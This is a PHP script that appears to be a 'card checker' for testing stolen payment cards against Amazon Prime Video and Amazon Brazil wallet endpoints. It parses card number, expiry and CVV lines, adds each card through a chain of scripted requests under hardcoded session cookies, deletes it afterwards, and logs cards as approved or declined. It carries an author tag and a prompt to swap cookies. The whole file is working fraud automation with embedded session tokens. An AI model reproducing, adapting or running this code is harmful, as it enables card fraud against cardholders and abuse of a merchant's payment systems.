<?php
error_reporting(0);
set_time_limit(0);


date_default_timezone_set('America/Sao_Paulo');

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}


function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
$time = time();


    function bin ($cc){

        $contents = file_get_contents("bins.csv");
        $pattern = preg_quote(substr($cc, 0, 6), '/');
        $pattern = "/^.*$pattern.*\$/m";
        if (preg_match_all($pattern, $contents, $matches)) {
            $encontrada = implode("\n", $matches[0]);
        }
        $pieces = explode(";", $encontrada);
        return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
    }
$bin = bin($lista);
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}


switch ($ano) { 
         case '22':$mes = '2022';break; 
         case '23':$ano = '2023';break; 
         case '24':$ano = '2024';break; 
         case '25':$ano = '2025';break; 
         case '26':$ano = '2026';break; 
         case '27':$ano = '2027';break; 
         case '28':$ano = '2028';break; 
         case '29':$ano = '2029';break; 
         case '30':$ano = '2030';break; 
         case '31':$ano = '2031';break; 
         case '32':$ano = '2032';break; 
}

######################################################

if (strpos(file_get_contents("aprovadas.txt"), "$cc") !== false) {
exit('<b><span class="badge badge-success" style="color:black">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-success" style="color:black">Cartão ja testado resultado: Aprovado!</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}


 else if (strpos(file_get_contents("reprovadas.txt"), "$cc") !== false) {
exit('<b><span class="badge badge-danger" style="color:black">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-warning" style="color:black">Cartão ja testado resultado: Repovada!</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}

else{

https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer//continueWidget


$iddd = 'ANISBXM2AV81B';


$cuki1 = 'Cookie: session-id=137-4271989-4230602;i18n-prefs=USD;lc-main-av=pt_BR;ubid-main-av=135-2663427-3053257;av-timezone=America/Sao_Paulo;x-main-av=tObfBUvs5R9t3cheFlGIwo1xTb5eoVoO3TAoNgdB7Lbatgt9rCzp0RLzLSLxajts;at-main-av=Atza|IwEBIE3EKDxANcG1r5yKxwWQ33rQ-NBn6TyPF-dwUd9txnV9EMIgsST06mtJJSDU5wtHYKy8xSms-Se19hjx5qwDn8ldjJeyKQvovQ_MlD9sQ-aMWZrtjmxvTtHEl2ASck_prssuNQ9T69iITkCa8OsJrGGvlHCDz-cq6ywEtN7gyIcB3_FbLQZsjMO2DLmggZtyENHWoIc8FxJ2WvqRQ8nRZD7tqWMZZSrDzfiOg_1JapmpiANlowDEck5R47JOlENy-JQ;sess-at-main-av="QUBknIGSy5ALbbYfKgLtd5o0aTJe59qn0cThxF+8Oi8=";csm-hit=tb:TSQK0CGW584GVECWBC7G+s-6YP5F0EFPH5PMGSNT0H9|1672796323007&t:1672796323007&adb:adblk_no;session-id-time=2082787201l;session-token=k69JiV8q1JJ7iytksdiQfx+0Pc5np5s0jA4WMG5MvIogh0RMvzdSqXIw4DAQ9ak4mL70UZjV3qL7OffV2uHblWLnXeudOoJVwbP1BiGmIqJdPiwZWSRJGjdWsRoyQzQoaTxNjsdhZvbw38eXKhubgh6j67M843YLtPatnTho9asNtwwie854rTiEl51vUGUBm4GfRXkvQA+SHqq1Fu14HzjW9igTLKlEwQnVR98T7ygqWIgj5b5IUme9f7Mnuqiq';


$cuki2 = 'Cookie: session-id=144-7803160-5647949;ubid-acbbr=134-8888752-3449108;sst-acbbr=Sst1|PQEGawxln9azENIL44y6kJviCe33Tp4fjzYd8FmCCpk3eZtRmhM-kky4J2bslyKsRiqYoG5yvzjhN02rX-I_IlxBcxdgG-HI5H-nrrR5mBf5ifHhnGRNEGs1inXDDZl_R1MjHKf_UG-7DEp2xLEDlwW7em2x07VFXTNzfU8u7dLDVKtEOgHVmX-OyUwmc-AVTod5qGOzsrodpr8fo1BNdh934ZurBKIyg7tX-2BmZdgBqP6vgs6WxTMk1nGlsEXPDhjCDfePPMTQk1pTVYp3R3Q5P9DQ4u1efOvlYEL8qZBHVz0;lc-acbbr=pt_BR;i18n-prefs=BRL;x-acbbr="@Pjye5sUqKDPpdbzJ1hfNDRl3Ohl13xJOBc1@e0?wEml@6w4@RQEj1k6bFak6wdY";at-acbbr=Atza|IwEBIPvr7eVAwxvYMcOeYUWz4n204p1VZB6IuZfBx-dJYLEnLyCshfkZlRLf6MiBzGncxxGnbz9oZR53lrIfeiILzQU2kEI3juI4tv9fqhL9RkXTfsZwEypPFzlOQGcMGpWTPs5rtROzauBs_BSXj_W-0_ykHKU2dh-WZDAShyvDzxasSX5V_cDoc61CHB_SzonRJ8UtmSdg2rWw7LUrPwIXg6vf;sess-at-acbbr="mxfj/Mcs/3xs5LN+keSGyHOsRevzGRhYbG8dnO8c3Eg=";session-token=dq7DlEzLdGp89nft/fNSzNRfMefA21Kf4pTb0fucJC7IitHkR2HcThM9GUKP43xYiwZ0nTZCcawCGIa7P1+2p/Zl9S8hfgF7MFNVhBuVsqpBbq142YtOrEQMDcKWdOzmsPP0jrxyIsPQ8arT01q24nxV8xiI1y+FOqhoijnwfo6o2BVw98/oXJl2lbyyzrEGLcknNYJLBFoxjaKWVcRUCIH750e3aGbc7oFZIQS5hJ+oyhr4Y3Syywgv89Fnu5gk;csm-hit=s-8FFHTD3PVFBZAHTR19ZT|1672796621617;session-id-time=2082758401l';


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_a?workflowType=PaymentFixup-TVOD');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 10',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 50',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'Origin: https://www.amazon.com',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo&',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki1.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$curll1 = curl_exec($ch);  
   $t1 = getStr($curll1, 'ppw-widgetState" value="','"');
/////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/'.$iddd.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 10',
'APX-Widget-Info: Subs:AmazonVideo/desktop/B7MM6W8Hoq1N',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 50',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'Origin: https://www.primevideo.com',
'Referer: https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_e?workflowType=PaymentFixup-TVOD',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki1.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AAddCreditCardEvent=&ppw-jsEnabled=true&ppw-widgetState='.$t1.'&ie=UTF-8&ppw-accountHolderName=Marcelo+silva&addCreditCardNumber='.$cc.'&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'');
$curll2 = curl_exec($ch);
 $t2 = getStr($curll2, '"ppw-widgetState\" value=\"','\"');
 $t3 = getStr($curll2, 'data-address-id=\"','\"');
///////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/'.$iddd.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 10',
'APX-Widget-Info: Subs:AmazonVideo/desktop/B7MM6W8Hoq1N',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 50',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'Origin: https://www.primevideo.com',
'Referer: https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_e?workflowType=PaymentFixup-TVOD',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki1.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3ASelectAddressEvent=&ppw-jsEnabled=true&ppw-widgetState='.$t2.'&ie=UTF-8&ppw-pickAddressType=Inline&ppw-addressSelection='.$t3.'');
$curll3 = curl_exec($ch);
   $t4 = getStr($curll3, 'ppw-widgetState\" value=\"','\"');
   $t5 = getStr($curll3, 'paymentInstrumentId":"','"');
///////////////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/'.$iddd.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 3.2',
'APX-Widget-Info: Subs:AmazonVideo/desktop/y4NoL7TC0tFV',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.primevideo.com',
'Referer: https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_a?workflowType=PaymentFixup-TVOD',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki1.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$t4.'&ie=UTF-8&ppw-instrumentRowSelection=instrumentId%3D'.$t5.'%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=');
$curll4 = curl_exec($ch);
//////////////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'device-memory: 8',
'sec-ch-device-memory: 8',
'dpr: 1',
'sec-ch-dpr: 1',
'viewport-width: 1920',
'sec-ch-viewport-width: 1920',
'rtt: 100',
'downlink: 10',
'ect: 4g',
'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Service-Worker-Navigation-Preload: true',
'Referer: https://www.amazon.com.br/gp/css/homepage.html?ref_=nav_AccountFlyout_ya',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki2.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$curll5 = curl_exec($ch);  
     $t6 = getStr($curll5, '":{"selectedInstrumentId":"','"');
     $t7 = getStr($curll5, 'YA:Wallet","serializedState":"','"');
////////////////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/'.$iddd.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 5.2',
'APX-Widget-Info: YA:Wallet/desktop/fsLWxt0R5eZN',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.amazon.com.br',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki2.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$t7.'&ppw-widgetEvent=StartEditEvent&ppw-iid='.$t6.'&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false');
 $curll6 = curl_exec($ch);  
 $t8 = getStr($curll6, 'ppw-widgetState\" value=\"','\"');
//////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/'.$iddd.'/continueWidget?sif_profile=APX-Encrypt-All-NA');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 5.2',
'APX-Widget-Info: YA:Wallet/desktop/fsLWxt0R5eZN',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.amazon.com.br',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki2.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22'.$t5.'%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Remove+from+wallet&ppw-jsEnabled=true&ppw-widgetState='.$t8.'&ie=UTF-8&ppw-accountHolderName=leonardo+sales&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'');

$curll7 = curl_exec($ch);            
   $t_fim = getStr($curll7, 'ppw-widgetState\" value=\"','\"');
//////////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/'.$iddd.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 5.2',
'APX-Widget-Info: YA:Wallet/desktop/fsLWxt0R5eZN',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.amazon.com.br',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cuki2.'',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/55555533xxxx.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/ddfrrrdeww23444.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$t_fim.'&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent');
$curll8 = curl_exec($ch); 
      
#FIM


if (strpos($curll4, 'payStationVerificationId":"","preferenceId":"')) { 



$file = fopen("aprovadas.txt", "a");
fwrite($file, "$cc\n");
fclose($file);


  exit("<i><b><span class='badge badge-success' style='color:black'>✔ Aprovada </span> ➔ </span><span class='badge badge-primary' style='color:black'> ".$cc."|".$mes."|".$ano."|".$cvv." </span> ➜ <span class='badge badge-info' style='color:black'> " . $bin . " </span> ➜</span> <span class='badge badge-success' style='color:black'> CARTAO APROVADO By: @Wolveriny</span> <br>");


}

else if (strpos($curll4, 'Houve um problema')) {  
	    

$file = fopen("reprovadas.txt", "a");
fwrite($file, "$cc\n");
fclose($file);
        
    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info">Cartão Recusado '.$msg.'</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');


      
}else if (strpos($curll4, 'incorreto')) { 
	    

$file = fopen("reprovadas.txt", "a");
fwrite($file, "$cc\n");
fclose($file);

    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info">Cartão Inválido  '.$msg.'</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');



      
     }
else if (strpos($curll4, 'There was a problem')) {  
	    

$file = fopen("reprovadas.txt", "a");
fwrite($file, "$cc\n");
fclose($file);
        
    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info" style="color:black" >Cartão Recusado'.$msg.'</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');

} else {
    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info">TROCAR COOKIES</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');

        

                }
                }
        



?>